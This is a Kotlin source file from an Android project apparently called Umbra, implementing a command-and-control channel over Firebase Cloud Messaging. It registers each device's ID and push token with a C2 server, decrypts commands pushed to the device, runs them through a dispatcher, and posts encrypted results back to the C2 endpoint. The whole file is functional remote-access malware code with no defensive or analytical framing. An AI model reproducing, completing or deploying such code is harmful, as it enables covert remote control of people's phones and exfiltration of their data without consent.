package org.umbra.core.c2

import android.util.Log
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage
import org.umbra.core.core.CryptoEngine
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.util.concurrent.TimeUnit

class UmbraFcmService : FirebaseMessagingService() {

    companion object {
        private const val TAG = "Umbra.FCM"
        private const val C2_REGISTER_PATH = "/api/register-fcm"
        private const val C2_RESULT_PATH = "/api/result"
    }

    private val http = OkHttpClient.Builder()
        .connectTimeout(10, TimeUnit.SECONDS)
        .writeTimeout(10, TimeUnit.SECONDS)
        .build()

    override fun onNewToken(token: String) {
        super.onNewToken(token)
        Log.d(TAG, "New FCM token: ${token.take(20)}...")
        C2Coordinator.updateFcmToken(token)

        val prefs = getSharedPreferences("umbra_prefs", MODE_PRIVATE)
        val deviceId = prefs.getString("device_id", "unknown") ?: "unknown"

        CoroutineScope(Dispatchers.IO).launch {
            try {
                val body = """{"device_id":"$deviceId","fcm_token":"$token"}"""
                val request = Request.Builder()
                    .url("${getC2Base()}$C2_REGISTER_PATH")
                    .post(body.toRequestBody("application/json".toMediaType()))
                    .build()
                http.newCall(request).execute()
                Log.d(TAG, "Token registered with C2")
            } catch (e: Exception) {
                Log.e(TAG, "Token registration failed: ${e.message}")
            }
        }
    }

    override fun onMessageReceived(message: RemoteMessage) {
        val encryptedPayload = message.data["p"] ?: return
        val cmdJson = try {
            CryptoEngine.decrypt(encryptedPayload)
        } catch (e: Exception) {
            Log.e(TAG, "FCM decrypt failed: ${e.message}")
            return
        }

        CoroutineScope(Dispatchers.IO).launch {
            val result = CommandDispatcher.dispatch(cmdJson)
            val encrypted = CryptoEngine.encrypt(result)

            if (C2Coordinator.isConnected()) {
                C2Coordinator.sendResult(encrypted)
            } else {
                try {
                    val body = encrypted
                    val request = Request.Builder()
                        .url("${getC2Base()}$C2_RESULT_PATH")
                        .post(body.toRequestBody("text/plain".toMediaType()))
                        .build()
                    http.newCall(request).execute()
                } catch (e: Exception) {
                    Log.e(TAG, "Result POST failed: ${e.message}")
                }
            }
        }
    }

    private fun getC2Base(): String {
        val prefs = getSharedPreferences("umbra_prefs", MODE_PRIVATE)
        return prefs.getString("c2_base_url", "https://10.0.2.2:8443") ?: "https://10.0.2.2:8443"
    }
}
